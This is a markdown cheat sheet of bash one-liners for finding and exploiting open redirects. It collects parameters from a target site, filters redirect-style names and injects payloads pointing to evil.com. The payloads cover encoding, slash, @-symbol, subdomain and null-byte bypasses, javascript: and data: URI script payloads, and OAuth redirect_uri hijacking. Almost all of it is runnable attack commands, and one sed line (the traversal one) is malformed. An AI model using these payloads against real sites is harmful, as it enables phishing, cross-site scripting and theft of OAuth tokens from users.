## Basic Open Redirect

### Parameter Collection

```bash
gau target.com | uro | grep "=" > parameter.txt
```
or if you have parameter.txt file
### Filter Redirect Parameters

```bash
grep -Ei "redirect|url|next|return|dest|continue|callback|goto|forward|out|view" parameter.txt > redirect_params.txt
```

### Basic Payload Injection

```bash
sed 's/=.*/=https:\/\/evil.com/' redirect_params.txt > basic_redirect.txt
```

### Automated Detection

```bash
httpx -l basic_redirect.txt -location -mc 301,302,307,308 -silent
```

## Slash & Protocol Confusion Tricks

### Protocol-Relative Redirect

```bash
sed 's/=.*/=\/\/evil.com/' redirect_params.txt > proto_relative.txt
```

### Triple Slash Redirect

```bash
sed 's/=.*/=\/\/\/evil.com/' redirect_params.txt > triple_slash.txt
```

### Mixed Slash Bypass

```bash
sed 's/=.*/=https:\/\\\/evil.com/' redirect_params.txt > mixed_slash.txt
```

## URL Encoding Tricks

### Single URL Encoding

```bash
sed 's/=.*/=%2f%2fevil.com/' redirect_params.txt > encoded.txt
```

### Double URL Encoding

```bash
sed 's/=.*/=%252f%252fevil.com/' redirect_params.txt > double_encoded.txt
```

## Domain Confusion Tricks

### @ Symbol Bypass

```bash
sed 's/=.*/=https:\/\/target.com@evil.com/' redirect_params.txt > at_symbol.txt
```

### Subdomain Validation Bypass

```bash
sed 's/=.*/=https:\/\/evil.com.target.com/' redirect_params.txt > subdomain.txt
```

## Path & Traversal Tricks

### Path Traversal Redirect

```bash
sed 's/=.*/=\/\/evil.com\/%2f..' redirect_params.txt > traversal.txt
```

### Relative Path Abuse

```bash
sed 's/=.*/=..\/..\/evil.com/' redirect_params.txt > relative_path.txt
```
## Fragment & Parameter Pollution

### Fragment Identifier Bypass

```bash
sed 's/=.*/=#https:\/\/evil.com/' redirect_params.txt > fragment.txt
```

### Parameter Pollution

```bash
sed 's/=.*/=\/home&next=https:\/\/evil.com/' redirect_params.txt > pollution.txt
```

## Chained Redirect Attacks

### Internal Redirect Chaining

```bash
sed 's/=.*/=\/redirect?url=https:\/\/evil.com/' redirect_params.txt > chained.txt
```

## Scheme Abuse

### JavaScript Scheme Redirect

```bash
sed 's/=.*/=javascript:alert(1)/' redirect_params.txt > js_scheme.txt
```

### Data URI Redirect

```bash
sed 's/=.*/=data:text\/html,<script>alert(1)<\/script>/' redirect_params.txt > data_uri.txt
```

## Null Byte & Legacy Tricks

### Null Byte Injection

```bash
sed 's/=.*/=https:\/\/evil.com%00.target.com/' redirect_params.txt > nullbyte.txt
```

## Header-Based Redirects

### Location Header Check

```bash
curl -I "https://target.com/path?next=https://evil.com"
```

## OAuth Open Redirect (High Impact)

### Filter OAuth Parameters

```bash
grep -Ei "redirect_uri|returnTo|callback|continue" parameter.txt > oauth_params.txt
```

### OAuth Payload Injection

```bash
sed 's/=.*/=https:\/\/evil.com/' oauth_params.txt > oauth_redirect.txt
```

## Path-Based Redirects (No parameter.txt)

### Path Fuzzing

```bash
ffuf -u https://target.com/FUZZ -w redirect_paths.txt
```

